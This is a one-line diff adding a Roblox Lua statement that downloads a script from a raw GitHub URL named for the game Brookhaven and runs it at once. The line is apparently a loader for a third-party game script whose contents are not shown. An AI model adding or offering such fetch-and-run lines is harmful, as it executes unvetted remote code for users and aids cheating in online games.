@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hiklom/hikka/main/Brookhaven%20(2).lua"))()
